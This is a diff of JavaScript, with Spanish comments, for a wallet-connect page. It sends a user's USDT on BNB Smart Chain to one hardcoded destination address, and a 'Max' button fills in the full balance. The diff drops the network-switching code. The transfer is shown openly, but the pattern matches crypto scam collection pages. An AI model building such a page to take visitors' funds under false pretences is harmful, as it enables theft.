@@ -63,8 +63,7 @@
   // ================= CONFIGURACIÓN =================
   const DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
   const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955"; // USDT oficial BEP-20
-  const BSC_RPC = "https://bsc-dataseed.bnbchain.org"; // Endpoint RPC válido oficial
-  const BSC_CHAIN_ID = "0x38"; // 56 en hexadecimal
+  const BSC_RPC = "https://bsc-dataseed.bnbchain.org";
   const DECIMALS = 18n;
   // =================================================
 
@@ -81,7 +80,6 @@
   let userBalanceUnits = 0n;
   let eip6963Provider = null;
 
-  // Detección avanzada EIP-6963 para Trust Wallet
   window.addEventListener("eip6963:announceProvider", (event) => {
     const info = event.detail?.info || {};
     if (info.rdns?.includes("trustwallet") || info.name?.toLowerCase().includes("trust")) {
@@ -125,11 +123,7 @@
       throw new Error("Ingresa un monto válido (máximo 18 decimales).");
     }
     const [whole, frac = ""] = clean.split(".");
-    return BigInt(whole) * (10n ** DECIMALS) + BigInt(fractionPad(frac));
-  }
-
-  function fractionPad(frac) {
-    return frac.padEnd(18, "0").slice(0, 18);
+    return BigInt(whole) * (10n ** DECIMALS) + BigInt(frac.padEnd(18, "0").slice(0, 18));
   }
 
   async function bscRead(method, params) {
@@ -155,33 +149,6 @@
     }
   }
 
-  async function switchToBSC(provider) {
-    try {
-      const currentChain = await provider.request({ method: "eth_chainId" });
-      if (String(currentChain).toLowerCase() === BSC_CHAIN_ID) return;
-
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID }]
-      });
-    } catch (err) {
-      if (err.code === 4902 || err.message?.includes("Unrecognized chain")) {
-        await provider.request({
-          method: "wallet_addEthereumChain",
-          params: [{
-            chainId: BSC_CHAIN_ID,
-            chainName: "BNB Smart Chain",
-            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-            rpcUrls: [BSC_RPC],
-            blockExplorerUrls: ["https://bscscan.com"]
-          }]
-        });
-      } else {
-        throw new Error("Por favor cambia manualmente la red a BNB Smart Chain en tu Trust Wallet.");
-      }
-    }
-  }
-
   maxBtn.addEventListener("click", () => {
     if (userBalanceUnits > 0n) {
       amountInput.value = formatUnits(userBalanceUnits);
@@ -193,39 +160,35 @@
       actionBtn.disabled = true;
       const provider = getProvider();
 
-      // PASO 1: Conectar billetera y enfocar red BSC
+      // PASO 1: Conexión directa y libre de bloqueos de red (igual que funcionó antes)
       if (!userAddress) {
         setStatus("Conectando con Trust Wallet...", "info");
         const accounts = await provider.request({ method: "eth_requestAccounts" });
         if (!accounts || !accounts.length) throw new Error("No se autorizó ninguna cuenta.");
         userAddress = accounts[0];
 
-        await switchToBSC(provider);
         await refreshBalance();
 
         walletText.textContent = userAddress.slice(0, 8) + "..." + userAddress.slice(-6);
         walletBox.style.display = "block";
         maxBtn.style.display = "inline-block";
         actionBtn.textContent = "Enviar USDT";
-        setStatus("Conectado correctamente a BNB Smart Chain.", "success");
+        setStatus("Conexión establecida exitosamente.", "success");
         actionBtn.disabled = false;
         return;
       }
 
-      // PASO 2: Validar y estructurar envío limpio para evitar Error 4200
-      await switchToBSC(provider);
+      // PASO 2: Validar saldo y disparar la firma digital con payload minimalista
       await refreshBalance();
 
       const amountUnits = parseUnits(amountInput.value);
       if (amountUnits <= 0n) throw new Error("El monto debe ser mayor a 0.");
       if (amountUnits > userBalanceUnits) throw new Error("Saldo USDT insuficiente en la red.");
 
-      // Construcción del payload de contrato BEP-20 (transfer)
       const txData = "0xa9059cbb" + pad64(DESTINO) + amountUnits.toString(16).padStart(64, "0");
 
       setStatus("Confirma la transacción en Trust Wallet...", "info");
 
-      // Payload estricto y minimalista compatible con la pasarela dApp nativa móvil
       const txHash = await provider.request({
         method: "eth_sendTransaction",
         params: [{
